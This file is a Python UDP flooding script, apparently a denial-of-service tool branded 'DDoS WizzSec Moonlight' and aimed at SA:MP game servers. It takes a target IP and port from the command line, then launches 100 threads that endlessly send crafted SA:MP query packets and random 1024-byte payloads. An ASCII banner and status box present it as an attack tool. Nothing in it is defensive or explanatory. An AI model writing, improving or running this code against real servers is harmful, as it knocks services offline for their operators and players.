import socket
import struct
import codecs,sys
import threading
import random
import time
import os
from colorama import Fore

attack = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
            DDoS WizzSec Moonlight
                   V : 1.0G1
              MADE BY : Wizzly
             TEAM  : Relax Sec
"""


ip = sys.argv[1]
port = sys.argv[2]
go = ip
bytes = 1024
thrs = 666
bost = 97658

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
codecs.decode("081e62da","hex_codec"), #cookie port 7796
codecs.decode("081e77da","hex_codec"),#cookie port 7777
codecs.decode("081e4dda","hex_codec"),#cookie port 7771
codecs.decode("021efd40","hex_codec"),#cookie port 7784
codecs.decode("021efd40","hex_codec"),#cookie port 1111 
codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
]
os.system('clear')
print(Fore.LIGHTMAGENTA_EX + attack)

print(Fore.LIGHTMAGENTA_EX+"ATTACK STATUS: ")
print("╔═════════════════")
print(f"║ IP    : {go}   ")
print(f"║ Port  : {port} ")
print(f"║ BPS   : {bytes}")
print(f"║ Thrds : {thrs} ")
print(f"║ Boost : {bost} ")
print(f"║ Bot   : {bytes} ")
print("╚═════════════════")





class MyThread(threading.Thread):
     def run(self):
         while True:
           sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
           msg = Pacotes[random.randrange(0,3)]
           sock.sendto(msg, (ip, int(port)))
           flood = random._urandom(1024)
           sock.sendto(flood, (ip, int(port)))
           
         if(int(port) == 7777):
           sock.sendto(Pacotes[5], (ip, int(port)))
         elif(int(port) == 7796):
           sock.sendto(Pacotes[5], (ip, int(port)))
         elif(int(port) == 7771):
           sock.sendto(Pacotes[5], (ip, int(port)))
         elif(int(port) == 7784):
           sock.sendto(Pacotes[5], (ip, int(port)))
         elif(int(port) == 3023):
           sock.sendto(Pacotes[5], (ip, int(port)))    

if __name__ == '__main__':
    try:
     for x in range(100):
       mythread = MyThread()
       mythread.start()
       time.sleep(.1)    
    except(KeyboardInterrupt):
      os.system('cls' if os.name == 'nt' else 'clear')
      print('SA:MP WizSec')
      print('\n\n')
      print('Ataque para ip {} foi parado'.format(go))
      pass
